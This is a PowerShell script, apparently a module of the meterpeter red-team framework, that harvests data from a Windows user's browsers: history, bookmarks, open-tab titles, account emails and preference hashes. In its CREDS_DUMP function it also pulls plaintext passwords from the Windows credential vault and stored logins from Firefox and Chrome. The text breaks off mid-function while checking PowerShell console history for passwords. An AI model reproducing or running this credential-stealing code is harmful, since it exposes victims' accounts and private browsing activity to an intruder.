<#
.SYNOPSIS
  Standalone Powershell script to dump Installed browsers information.

Author: r00t-3xp10it (SSA RedTeam @2020)
  Required Dependencies: IE, Firefox, Chrome
  Optional Dependencies: None
  PS Script Dev Version: v1.15

.DESCRIPTION
   Standalone Powershell script to dump Installed browsers information sutch as: HomePage, Browser Version,
   accepted Language, Download Directory, URL History, Bookmarks, Extentions, Start Page, stored creds, etc..
   The dumps will be Saved into $env:TMP folder. Unless this script 2º argument its used to input another Logfile
   storage location. If executed with the 2º arg then GetBrowsers will store the logfile in the Input location.

.NOTES
   PS C:\> Get-Help ./GetBrowsers.ps1 -full
   Access This Cmdlet Comment-based Help

.EXAMPLE
   PS C:\> ./GetBrowsers.ps1
   Display List of arguments available

.EXAMPLE
   PS C:\> ./GetBrowsers.ps1 -RECON
   Fast Recon (Browsers and versions only)

.EXAMPLE
   PS C:\> ./GetBrowsers.ps1 -FIREFOX
   Enumerates FireFox Browser information Only.

.EXAMPLE
   PS C:\> ./GetBrowsers.ps1 -ALL
   Enumerates Internet Explorer (IE), FireFox and Chrome Browsers information.
   
.EXAMPLE
   PS C:\> ./GetBrowsers.ps1 -ADDONS $env:USERPROFILE\Desktop
   Enumerates ALL Browsers addons and saves logfile to: $env:USERPROFILE\Desktop\BrowserEnum.log

.INPUTS
   None. This cmdlet does not accept any inputs besides <-arguments>

.OUTPUTS
   Saves BrowserEnum.log to the selected directory. 'tmp' is the default.

.LINK
    https://github.com/r00t-3xp10it/meterpeter
    https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/GetBrowsers.ps1
#>


$Path = $null
$mpset = $False
$param1 = $args[0] # User Inputs [Arguments]
$param2 = $args[1] # User Inputs [Arguments]
$host.UI.RawUI.WindowTitle = " @GetBrowsers v1.15"
## Auto-Set @Args in case of User empty inputs (Set LogFile Path).
If(-not($param2)){$LogFilePath = "$env:TMP"}else{$LogFilePath = "$param2";$mpset = $True}
If(-not($param1)){
    ## Required (Mandatory) Parameters/args Settings
    echo "`nGetBrowsers - Enumerate installed browser(s) information ." > $LogFilePath\BrowserEnum.log
    echo "[ ERROR ] This script requires parameters (-args) to run ..`n" >> $LogFilePath\BrowserEnum.log
    echo "Syntax: <scriptname> <-arg>(mandatory) <arg>(optional)`n" >> $LogFilePath\BrowserEnum.log
    echo "The following mandatory args are available:" >> $LogFilePath\BrowserEnum.log
    echo "./GetBrowsers.ps1 -RECON            Fast Recon (Browsers and versions)" >> $LogFilePath\BrowserEnum.log
    echo "./GetBrowsers.ps1 -IE               Enumerates IE browser information Only." >> $LogFilePath\BrowserEnum.log
    echo "./GetBrowsers.ps1 -ALL              Enumerates IE, Firefox, Chrome information." >> $LogFilePath\BrowserEnum.log
    echo "./GetBrowsers.ps1 -CHROME           Enumerates Chrome Browser information Only." >> $LogFilePath\BrowserEnum.log
    echo "./GetBrowsers.ps1 -FIREFOX          Enumerates Firefox Browser information Only." >> $LogFilePath\BrowserEnum.log
    echo "./GetBrowsers.ps1 -ADDONS           Enumerates ALL browsers extentions installed." >> $LogFilePath\BrowserEnum.log
    echo "./GetBrowsers.ps1 -CREDS            Enumerates ALL browsers credentials stored.`n" >> $LogFilePath\BrowserEnum.log
    echo "The following Optional args are available:" >> $LogFilePath\BrowserEnum.log
    echo "./GetBrowsers.ps1 -IE `$env:TMP      Enumerates selected browser and saves logfile to TEMP.`n" >> $LogFilePath\BrowserEnum.log
    Get-Content $LogFilePath\BrowserEnum.log;Remove-Item $LogFilePath\BrowserEnum.log -Force
        ## For those who insiste in running this script outside meterpeter
        If(-not(Test-Path "$env:tmp\Update-KB4524147.ps1")){
            Start-Sleep -Seconds 8
        }
    Exit
}


## [GetBrowsers] PS Script Banner (Manual Run)
# For those who insiste in running this script outside meterpeter
Write-Host "GetBrowsers - Enumerate installed browser(s) information." -ForeGroundColor Green
If($mpset -eq $True){Write-Host "[i] LogFile => $LogFilePath\BrowserEnum.log" -ForeGroundColor yellow}
Start-sleep -Seconds 1

## Get System Default Configurations
$RHserver = "LogonServer  : "+"$env:LOGONSERVER"
$Caption = Get-CimInstance Win32_OperatingSystem|Format-List *|findstr /I /B /C:"Caption"
If($Caption){$ParseCap = $Caption -replace '                                   :','      :'}else{$ParseCap = "Caption      : Not Found"}
## Get System Default webBrowser
$DefaultBrowser = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\https\UserChoice' -ErrorAction SilentlyContinue).ProgId
If($DefaultBrowser){$Parse_Browser_Data = $DefaultBrowser.split("-")[0] -replace 'URL','' -replace 'HTML','' -replace '.HTTPS',''}else{$Parse_Browser_Data = "Not Found"}
$MInvocation = "WebBrowser   : "+"$Parse_Browser_Data"+" (PreDefined)";
## Get System UserAgent string
$IntSet = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\internet settings" -Name 'User Agent' -ErrorAction SilentlyContinue|Select-Object 'User Agent'
If($IntSet){$ParsingIntSet = $IntSet -replace '@{User Agent=','UserAgent    : ' -replace '}',''}else{$ParsingIntSet = "UserAgent    : Not Found"}

## Writting LogFile to the selected path in: { $param2 var }
echo "`n`nSystem Defaults" > $LogFilePath\BrowserEnum.log
echo "---------------" >> $LogFilePath\BrowserEnum.log
echo "$RHserver" >> $LogFilePath\BrowserEnum.log
echo "$ParseCap" >> $LogFilePath\BrowserEnum.log 
echo "$ParsingIntSet" >> $LogFilePath\BrowserEnum.log
## Get Flash Internal Name/Version
If(-not(Test-Path "$env:WINDIR\system32\macromed\flash\flash.ocx")){
    echo "flashName    : Not Found" >> $LogFilePath\BrowserEnum.log
}else{
    $flash = Get-Item "$env:WINDIR\system32\macromed\flash\flash.ocx"|select *
    $flashName = $flash.versioninfo.InternalName
    echo "flashName    : $flashName" >> $LogFilePath\BrowserEnum.log
}
echo "$MInvocation" >> $LogFilePath\BrowserEnum.log


function ConvertFrom-Json20([object] $item){
    ## Json Files Convertion to text
    Add-Type -AssemblyName System.Web.Extensions
    $ps_js = New-Object System.Web.Script.Serialization.JavaScriptSerializer
    return ,$ps_js.DeserializeObject($item)    
}


function BROWSER_RECON {
    ## Detect ALL Available browsers Installed and the PreDefined browser name
    $DefaultBrowser = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\https\UserChoice' -ErrorAction SilentlyContinue).ProgId
    If($DefaultBrowser){$MInvocation = $DefaultBrowser.split("-")[0] -replace 'URL','' -replace 'HTML','' -replace '.HTTPS',''}else{$MInvocation = "Not Found"}
    $IEVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer" -ErrorAction SilentlyContinue).version
    If($IEVersion){$IEfound = "Found"}else{$IEfound = "False";$IEVersion = "            "}
    $Chrome_App = (Get-ItemProperty "HKCU:\Software\Google\Chrome\BLBeacon" -ErrorAction SilentlyContinue).version
    If($Chrome_App){$CHfound = "Found"}else{$CHfound = "False";$Chrome_App = "  "}
    If(-not(Test-Path -Path "$env:APPDATA\Mozilla\Firefox\Profiles")){
        $FFfound = "False";$ParsingData = "  "
    }else{
        $FFfound = "Found"
        $Preferencies = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\prefs.js"
        $JsPrefs = Get-content $Preferencies|Select-String "extensions.lastPlatformVersion"
        $ParsingData = $JsPrefs[0] -replace 'user_pref\(','' -replace '\"','' -replace ',','' -replace '\);','' -replace 'extensions.lastPlatformVersion','' -replace ' ',''
    }

    ## Build Table to display results found
    echo "`n`nBrowser    Status    Version         PreDefined" > $LogFilePath\BrowserEnum.log
    echo "-------    ------    -------         ----------" >> $LogFilePath\BrowserEnum.log
    echo "IE         $IEfound     $IEVersion    $MInvocation" >> $LogFilePath\BrowserEnum.log
    echo "CHROME     $CHfound     $Chrome_App" >> $LogFilePath\BrowserEnum.log
    echo "FIREFOX    $FFfound     $ParsingData" >> $LogFilePath\BrowserEnum.log
}


function IE_Dump {
    ## Retrieve IE Browser Information
    echo "`n`nIE Browser" >> $LogFilePath\BrowserEnum.log
    echo "----------" >> $LogFilePath\BrowserEnum.log
    ## New MicrosoftEdge Update have changed the binary name to 'msedge' ..
    $CheckVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer" -ErrorAction SilentlyContinue).version
    If($CheckVersion -lt '9.11.18362.0'){$ProcessName = "MicrosoftEdge"}else{$ProcessName = "msedge"}
    $IEVersion = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer" -Name 'Version' -ErrorAction SilentlyContinue|Select-Object 'Version'
    If(-not($IEVersion) -or $IEVersion -eq $null){
        echo "Could not find any Browser Info .." >> $LogFilePath\BrowserEnum.log
    }else{
        $IEData = $IEVersion -replace '@{Version=','Version      : ' -replace '}',''
        $KBNumber = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer" -Name 'svcKBNumber'|Select-Object 'svcKBNumber'
        $KBData = $KBNumber -replace '@{svcKBNumber=','KBUpdate     : ' -replace '}',''
        $RegPrefs = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\Main\" -Name 'start page'|Select-Object 'Start Page'
        $ParsingData = $RegPrefs -replace '@{Start Page=','HomePage     : ' -replace '}',''
        $LocalPage = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\Main\" -Name 'Search Page'|Select-Object 'Search Page'
        $ParsingLocal = $LocalPage -replace '@{Search Page=','SearchPage   : ' -replace '}',''
        $IntSet = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\internet settings" -Name 'User Agent'|Select-Object 'User Agent'
        $ParsingIntSet = $IntSet -replace '@{User Agent=','UserAgent    : ' -replace '}',''
        $DownloadDir = Get-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "{374DE290-123F-4565-9164-39C4925E467B}"|findstr /I /C:"Downloads"
        $ParseDownload = $DownloadDir -replace '{374DE290-123F-4565-9164-39C4925E467B} :','Downloads    :'
        $logfilefolder = (Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders").Cache
        $dataparse = "INetCache    : "+"$logfilefolder"

        ## New MicrosoftEdge Update have changed the binary name to 'msedge' ..
        $IETestings = (Get-Process $ProcessName -ErrorAction SilentlyContinue).Responding
        If($IETestings -eq $True){$Status = "Status       : Active"}else{$Status = "Status       : Stoped"}

        ## Writting LogFile to the selected path in: { $param2 var }
        echo "$Status" >> $LogFilePath\BrowserEnum.log
        echo "$KBData" >> $LogFilePath\BrowserEnum.log
        echo "$IEData" >> $LogFilePath\BrowserEnum.log
        echo "$ParseDownload" >> $LogFilePath\BrowserEnum.log
        echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
        echo "$ParsingLocal" >> $LogFilePath\BrowserEnum.log
        echo "$dataparse" >> $LogFilePath\BrowserEnum.log
    }

    ## Dump MicrosoftEdge.exe (OR: msedge.exe) binary path
    $BinaryPath = Get-Process $ProcessName -ErrorAction SilentlyContinue
    If(-not($BinaryPath) -or $BinaryPath -eq $null){
        echo "BinaryPath   : {requires $ProcessName process running to dump path}" >> $LogFilePath\BrowserEnum.log
    }else{
        $BinaryPath = Get-Process $ProcessName|Select -ExpandProperty Path
        $parseData = $BinaryPath[0]
        echo "BinaryPath   : $parseData" >> $LogFilePath\BrowserEnum.log
    }

    ## Dump IE Last Active Tab windowsTitle
    echo "`nActive Browser Tab" >> $LogFilePath\BrowserEnum.log
    echo "------------------" >> $LogFilePath\BrowserEnum.log
    $check = Get-Process $ProcessName -ErrorAction SilentlyContinue
    If(-not($check)){
        echo "{requires $ProcessName process running to dump tab}`n" >> $LogFilePath\BrowserEnum.log
    }else{
        $StoreData = Get-Process $ProcessName | Select -ExpandProperty MainWindowTitle
        $ParseData = $StoreData | where {$_ -ne ""}
        $MyPSObject = $ParseData -replace '- Microsoft​ Edge',''
        ## Write my PSobject to logfile
        echo "$MyPSObject`n" >> $LogFilePath\BrowserEnum.log
    }

    ## Retrieve IE history URLs
    echo "`nIE History" >> $LogFilePath\BrowserEnum.log
    echo "----------" >> $LogFilePath\BrowserEnum.log
    $IEHistory = Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Internet Explorer\TypedURLs" -ErrorAction SilentlyContinue|findstr /B /I "url"
    If(-not($IEHistory) -or $IEHistory -eq $null){
        echo "Could not find any History .." >> $LogFilePath\BrowserEnum.log
    }else{
        Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Internet Explorer\TypedURLs"|findstr /B /I "url" >> $LogFilePath\BrowserEnum.log
    }

    ## Retrieve IE Bookmarks
    # Source: https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1
    echo "`nIE Bookmarks" >> $LogFilePath\BrowserEnum.log
    echo "------------" >> $LogFilePath\BrowserEnum.log
    $URLs = Get-ChildItem -Path "$Env:SYSTEMDRIVE\Users\" -Filter "*.url" -Recurse -ErrorAction SilentlyContinue
    ForEach ($URL in $URLs) {
        if ($URL.FullName -match 'Favorites') {
            $User = $URL.FullName.split('\')[2]
            Get-Content -Path $URL.FullName | ForEach-Object {
                try {
                    if ($_.StartsWith('URL')) {
                        ## parse the .url body to extract the actual bookmark location
                        $URL = $_.Substring($_.IndexOf('=') + 1)
                            if($URL -match $Search) {
                                echo "$URL" >> $LogFilePath\BrowserEnum.log
                            }
                    }
                }
                catch {
                    echo "Error parsing url: $_" >> $LogFilePath\BrowserEnum.log
                }
            }
        }
    }
}


function FIREFOX {
    ## Retrieve FireFox Browser Information
    echo "`n`nFireFox Browser" >> $LogFilePath\BrowserEnum.log
    echo "---------------" >> $LogFilePath\BrowserEnum.log
    $Path = Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles";
    If($Path -eq $True){
        $Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\prefs.js"

        ## Test if browser its active 
        $FFTestings = (Get-Process Firefox -ErrorAction SilentlyContinue).Responding
        If($FFTestings -eq $True){$Status = "Status       : Active"}else{$Status = "Status       : Stoped"}
        echo "$Status" >> $LogFilePath\BrowserEnum.log

        ## get browser countryCode
        $JsPrefs = Get-content "$Path"|Select-String "browser.search.countryCode";
        $ParsingData = $JsPrefs[0] -replace 'user_pref\(','' -replace '\"','' -replace ',',':' -replace '\);','' -replace 'browser.search.countryCode','countryCode  '
        echo "$ParsingData" >> $LogFilePath\BrowserEnum.log

        ## get PlatformVersion
        $JsPrefs = Get-content "$Path"|Select-String "extensions.lastPlatformVersion"
        $ParsingData = $JsPrefs[0] -replace 'user_pref\(','' -replace '\"','' -replace ',',':' -replace '\);','' -replace 'extensions.lastPlatformVersion','Version      '
        echo "$ParsingData" >> $LogFilePath\BrowserEnum.log

        ## get brownser startup page
        $JsPrefs = Get-content "$Path"|Select-String "browser.startup.homepage"
        $ParsingData = $JsPrefs[0] -replace 'user_pref\(','' -replace '\"','' -replace ',',':' -replace '\);','' -replace 'browser.startup.homepage','HomePage     '
        echo "$ParsingData" >> $LogFilePath\BrowserEnum.log

        ## get browser DownloadDir
        $JsPrefs = Get-content "$Path"|Select-String "browser.download.lastDir";
        $ParsingData = $JsPrefs[0] -replace 'user_pref\(','' -replace '\"','' -replace ',',':' -replace '\);','' -replace 'browser.download.lastDir','Downloads    '
        echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
    }else{
        echo "Could not find any Browser Info .." >> $LogFilePath\BrowserEnum.log
    }

    ## Dump Firefox.exe binary path
    $BinaryPath = Get-Process firefox -ErrorAction SilentlyContinue
    If(-not($BinaryPath) -or $BinaryPath -eq $null){
        echo "BinaryPath   : {requires firefox process running to dump path}" >> $LogFilePath\BrowserEnum.log
    }else{
        $BinaryPath = Get-Process firefox|Select -ExpandProperty Path
        $parseData = $BinaryPath[0]
        echo "BinaryPath   : $parseData" >> $LogFilePath\BrowserEnum.log
    }

    ## Dump Firefox Last Active Tab windowsTitle
    echo "`nActive Browser Tab" >> $LogFilePath\BrowserEnum.log
    echo "------------------" >> $LogFilePath\BrowserEnum.log
    $check = Get-Process firefox -ErrorAction SilentlyContinue
    If(-not($check)){
        echo "{requires firefox process running to dump tab}`n" >> $LogFilePath\BrowserEnum.log
    }else{
        $StoreData = Get-Process firefox | Select -ExpandProperty MainWindowTitle
        $ParseData = $StoreData | where {$_ -ne ""}
        $MyPSObject = $ParseData -replace '- Mozilla Firefox',''
        ## Write my PSobject to logfile
        echo "$MyPSObject`n" >> $LogFilePath\BrowserEnum.log
    }

    ## Dump FIREFOX HISTORY URLs
    # Source: https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1
    echo "`nFireFox History" >> $LogFilePath\BrowserEnum.log
    echo "---------------" >> $LogFilePath\BrowserEnum.log
    If($Path -eq $False) {
        echo "Could not find any History .." >> $LogFilePath\BrowserEnum.log
    }else{
        $Profiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\"
        $Regex = '([a-zA-Z]{3,})://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
        Get-Content $Profiles\places.sqlite | Select-String -Pattern $Regex -AllMatches | % { $_.Matches } | % { $_.Value } | Sort-Object -Unique | % {
            $Value = New-Object -TypeName PSObject -Property @{
                FireFoxHistoryURL = $_
            }
            if ($Value -match $Search) {
                $ParsingData = $Value -replace '@{FireFoxHistoryURL=','' -replace '}',''
                echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
            }
        }
    }

    ## TODO: Retrieve FireFox bookmarks
    echo "`nFirefox Bookmarks" >> $LogFilePath\BrowserEnum.log
    echo "-----------------" >> $LogFilePath\BrowserEnum.log
    $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\bookmarkbackups\*.jsonlz4" # delete last - from Path
    If(-not(Test-Path -Path "$Bookmarks_Path")) {
        echo "Could not find any Bookmarks .." >> $LogFilePath\BrowserEnum.log
    }else{
        ## TODO: I cant use 'ConvertFrom-Json' cmdlet because it gives
        # 'primitive JSON invalid error' parsing jsonlz4 to text|csv ...
        $Json = Get-Content "$Bookmarks_Path" -Raw
        #$Regex = $Json -replace '[^a-zA-Z0-9/:.]','' # Replace all chars that does not match the Regex
        $Regex = $Json -replace '.*_','' -replace '.*©','' -replace '.*®','' -replace '.*¯','' -replace '.*ø','' -replace '.*þ','' -replace '.*Š','' -replace '.*‡','' -replace '.*¼','' -replace '.*±','' -replace '.*§','' -replace '.*™','' -replace '.*†','' -replace '.*»','' -replace '.*¥',''
            ForEach ($Key in $Regex){
                echo "$Key" >> $LogFilePath\BrowserEnum.log
            }
        }
}


function CHROME {
    ## Retrieve Google Chrome Browser Information
    echo "`n`nChrome Browser" >> $LogFilePath\BrowserEnum.log
    echo "--------------" >> $LogFilePath\BrowserEnum.log
    $Chrome_App = Get-ItemProperty 'HKCU:\Software\Google\Chrome\BLBeacon' -ErrorAction SilentlyContinue
    If(-not($Chrome_App) -or $Chrome_App -eq $null){
        echo "Could not find any Browser Info .." >> $LogFilePath\BrowserEnum.log
    }else{
        ## Test if browser its active 
        $Preferencies_Path = get-content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
        $CHTestings = (Get-Process Chrome -ErrorAction SilentlyContinue).Responding
        If($CHTestings -eq $True){$Status = "Status       : Active"}else{$Status = "Status       : Stoped"}
        echo "$Status" >> $LogFilePath\BrowserEnum.log

        ## Retrieve Download Pref Settings
        $Parse_String = $Preferencies_Path.split(",")
        $Search_Download = $Parse_String|select-string "download"
        $Store_Dump = $Search_Download[1] # download_history Property
        $Parse_Dump = $Store_Dump -replace '"','' -replace ':','      : ' -replace 'download_history','History'
        echo "$Parse_Dump" >> $LogFilePath\BrowserEnum.log

        ## Retrieve Browser accept languages
        $Parse_String = $Preferencies_Path.split(",")
        $Search_Lang = $Parse_String|select-string "accept_languages"
        $Parse_Dump = $Search_Lang -replace '"','' -replace 'intl:{','' -replace ':','    : ' -replace 'accept_languages','Languages'
        echo "$Parse_Dump" >> $LogFilePath\BrowserEnum.log

        ## Retrieve Browser Version
        $GCVersionInfo = (Get-ItemProperty 'HKCU:\Software\Google\Chrome\BLBeacon').Version
        echo "Version      : $GCVersionInfo" >> $LogFilePath\BrowserEnum.log

        ## Retrieve Download Folder (default_directory) Settings
        $Parse_String = $Preferencies_Path.split(",")
        $Download_Dir = $Parse_String|select-string "savefile"
        If(-not($Download_Dir) -or $Download_Dir -eq $null){
            echo "Downloads    : $env:userprofile\Downloads" >> $LogFilePath\BrowserEnum.log
        }else{
            $Parse_Dump = $Download_Dir -replace '"','' -replace '{','' -replace '}','' -replace 'default_directory:','' -replace 'savefile:','Downloads    : '
            echo "$Parse_Dump" >> $LogFilePath\BrowserEnum.log
        }

        ## Dump Chrome.exe binary path
        $BinaryPath = Get-Process chrome -ErrorAction SilentlyContinue
        If(-not($BinaryPath) -or $BinaryPath -eq $null){
            echo "BinaryPath   : {requires chrome process running to dump path}" >> $LogFilePath\BrowserEnum.log
        }else{
            $BinaryPath = Get-Process chrome|Select -ExpandProperty Path
            $parseData = $BinaryPath[0]
            echo "BinaryPath   : $parseData" >> $LogFilePath\BrowserEnum.log
        }

        ## Dump Chrome Last Active Tab windowsTitle
        echo "`nActive Browser Tab" >> $LogFilePath\BrowserEnum.log
        echo "------------------" >> $LogFilePath\BrowserEnum.log
        $check = Get-Process chrome -ErrorAction SilentlyContinue
        If(-not($check)){
            echo "{requires chrome process running to dump tab}`n" >> $LogFilePath\BrowserEnum.log
        }else{
            $StoreData = Get-Process chrome | Select -ExpandProperty MainWindowTitle
            $ParseData = $StoreData | where {$_ -ne ""}
            $MyPSObject = $ParseData -replace '- Google Chrome',''
            ## Write my PSobject to logfile
            echo "$MyPSObject`n" >> $LogFilePath\BrowserEnum.log
        }

        ## Retrieve Email(s) from Google CHROME preferencies File ..
        $Parse_String = $Preferencies_Path.split(",")
        $Search_Email = $Parse_String|select-string "email"
        $Parse_Dump = $Search_Email -replace '"','' -replace 'email:',''
        If(-not($Search_Email) -or $Search_Email -eq $null){
            echo "Email            : None Email Found .." >> $LogFilePath\BrowserEnum.log
        }else{
            ## Build new PSObject to store emails found
            $Store = ForEach ($Email in $Parse_Dump){
                New-Object -TypeName PSObject -Property @{
                    Emails = $Email
                }
            }
            ## Write new PSObject to logfile
            echo $Store >> $LogFilePath\BrowserEnum.log
            }
        }

        ## Retrieve Chrome History
        # Source: https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Get-BrowserData.ps1
        echo "Chrome History" >> $LogFilePath\BrowserEnum.log
        echo "--------------" >> $LogFilePath\BrowserEnum.log
        $History_Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
        If(-not(Test-Path -Path $History_Path)){
            echo "Could not find any History .." >> $LogFilePath\BrowserEnum.log
        }else{
            $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
            $Get_Values = Get-Content -Path "$History_Path"|Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
            $Get_Values | ForEach-Object {
                $Key = $_
                if ($Key -match $Search){
                    echo "$_" >> $LogFilePath\BrowserEnum.log
                }
            }
        }

        ## Retrieve Chrome bookmarks
        echo "`nChrome Bookmarks" >> $LogFilePath\BrowserEnum.log
        echo "----------------" >> $LogFilePath\BrowserEnum.log
        $Bookmarks_Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Bookmarks"
        If(-not(Test-Path -Path $Bookmarks_Path)) {
            echo "Could not find any Bookmarks .." >> $LogFilePath\BrowserEnum.log
        }else{
            $Json = Get-Content $Bookmarks_Path
            $Output = ConvertFrom-Json20($Json)
            $Jsonobject = $Output.roots.bookmark_bar.children
            $Jsonobject.url |Sort -Unique | ForEach-Object {
                if ($_ -match $Search) {
                    echo "$_" >> $LogFilePath\BrowserEnum.log
                }
            }
        }

        ## Retrieve Chrome Cookies (hashs)
        echo "`nChrome Cookies" >> $LogFilePath\BrowserEnum.log
        echo "--------------" >> $LogFilePath\BrowserEnum.log
        $Cookie_Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
        If(-not(Test-Path -Path $Cookie_Path)){
            echo "Could not find any Cookies .." >> $LogFilePath\BrowserEnum.log
        }else{
            $Preferencies_Path = get-content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
            $Parse_String = $Preferencies_Path.split(",");$Find_MyHash = $Parse_String|Select-String "hash"
            $BadChars = $Find_MyHash -replace '"setting":{"hasHighScore":false',''
            $Dump_Key_Hash = $BadChars|where-object {$_}
            echo $Dump_Key_Hash >> $LogFilePath\BrowserEnum.log
        }
}


function ADDONS {  
    ## Retrieve IE addons
    echo "`n`n[ IE ]" >> $LogFilePath\BrowserEnum.log
    echo "`nName" >> $LogFilePath\BrowserEnum.log
    echo "----" >> $LogFilePath\BrowserEnum.log
    If(-not(Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Ext\Settings")){
        echo "None addons found .." >> $LogFilePath\BrowserEnum.log
    }else{
        If(-not(Test-Path HKCR:)){New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT|Out-Null} 
        $Registry_Keys = @( "HKCU:\Software\Microsoft\Windows\CurrentVersion\Ext\Settings",
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\explorer\Browser Helper Objects",
        "HKLM:\Software\Microsoft\Internet Explorer\URLSearchHooks",
        "HKLM:\Software\Microsoft\Internet Explorer\Extensions",
        "HKCU:\Software\Microsoft\Internet Explorer\Extensions" )
        $Registry_Keys|Get-ChildItem -Recurse -ErrorAction SilentlyContinue|Select -ExpandProperty PSChildName |  
            ForEach-Object { 
                If(Test-Path "HKCR:\CLSID\$_"){ 
                    $CLSID = Get-ItemProperty -Path "HKCR:\CLSID\$_" | Select-Object @{n="Name";e="(default)"}
                    $CLSIData = $CLSID -replace '@{Name=','' -replace '}',''
                    echo "$CLSIData" >> $LogFilePath\BrowserEnum.log
                }
            }
    }

    ## Retrieve firefox addons
    echo "`n`n[ Firefox ]" >> $LogFilePath\BrowserEnum.log
    If(-not(Test-Path "$Env:AppData\Mozilla\Firefox\Profiles\*.default\extensions.json")){
        echo "None addons found .." >> $LogFilePath\BrowserEnum.log
    }else{
        $Json = Get-Content "$Env:AppData\Mozilla\Firefox\Profiles\*.default\extensions.json" -Raw|ConvertFrom-Json|select *
        $Json.addons|select-object -property defaultLocale|Select-Object -ExpandProperty defaultLocale|Select-Object Name,description >> $LogFilePath\BrowserEnum.log
    }

    ## Retrieve Chrome addons
    echo "`n`n[ Chrome ]" >> $LogFilePath\BrowserEnum.log
    If(-not(Test-Path "\\$env:COMPUTERNAME\c$\users\*\appdata\local\Google\Chrome\User Data\Default\Extensions\*\*\manifest.json")){
        echo "None addons found .." >> $LogFilePath\BrowserEnum.log
    }else{
        $Json = Get-Content "\\$env:COMPUTERNAME\c$\users\*\appdata\local\Google\Chrome\User Data\Default\Extensions\*\*\manifest.json" -Raw|ConvertFrom-Json|select *
        $Json|select-object -property name,version,update_url >> $LogFilePath\BrowserEnum.log
    }
}


function CREDS_DUMP {
    ## TODO: Retrieve IE Credentials
    echo "`n`n[ IE ]" >> $LogFilePath\BrowserEnum.log
    echo "`nhttps://github.com/HanseSecure/credgrap_ie_edge/blob/master/credgrap_ie_edge.ps1" >> $LogFilePath\BrowserEnum.log
    echo "--------------------------------------------------------------------------------" >> $LogFilePath\BrowserEnum.log
    [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
    $vault = New-Object Windows.Security.Credentials.PasswordVault
    $DumpVault = $vault.RetrieveAll()| % { $_.RetrievePassword();$_ }|select Resource, UserName, Password|Sort-Object Resource|ft -AutoSize
    If(-not($DumpVault) -or $DumpVault -eq $null){
        echo "None Credentials found .." >> $LogFilePath\BrowserEnum.log
    }else{
        echo "$DumpVault" >> $LogFilePath\BrowserEnum.log
    }

    ## Retrieve FireFox Credentials
    echo "`n`n[ Firefox ]" >> $LogFilePath\BrowserEnum.log
    echo "`ngit clone https://github.com/Unode/firefox_decrypt.git" >> $LogFilePath\BrowserEnum.log
    echo "------------------------------------------------------" >> $LogFilePath\BrowserEnum.log
    If(-not(Test-Path "$Env:AppData\Mozilla\Firefox\Profiles\*.default\logins.json")){
        echo "None Credentials found .." >> $LogFilePath\BrowserEnum.log
    }else{
        $Json = get-content $Env:AppData\Mozilla\Firefox\Profiles\*.default\logins.json|ConvertFrom-Json|select *
        $Json.logins|select-object hostname,encryptedUsername >> $LogFilePath\BrowserEnum.log
        $Json.logins|select-object hostname,encryptedPassword >> $LogFilePath\BrowserEnum.log
    }

    ## TODO: Retrieve Chrome Credentials (plain text)
    echo "`n`n[ Chrome ]" >> $LogFilePath\BrowserEnum.log
    echo "`nEnumerating LogIn Data Stored (plain text)" >> $LogFilePath\BrowserEnum.log
    echo "------------------------------------------" >> $LogFilePath\BrowserEnum.log
    If(-not(Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data")){
        echo "None Credentials found .." >> $LogFilePath\BrowserEnum.log
    }else{
        $Json = get-content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"|select-string "http"
        If(-not($Json) -or $Json -eq $null){
            echo "None Credentials found .." >> $LogFilePath\BrowserEnum.log
        }else{
            $Regex = $Json -replace '[^a-zA-Z0-9/:.]','' # Replace all chars that does not match the Regex
            echo "$Regex" >> $LogFilePath\BrowserEnum.log
        }
    }

    ## Search for passwords in { ConsoleHost_history }
    If(-not(Test-Path "$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt")){
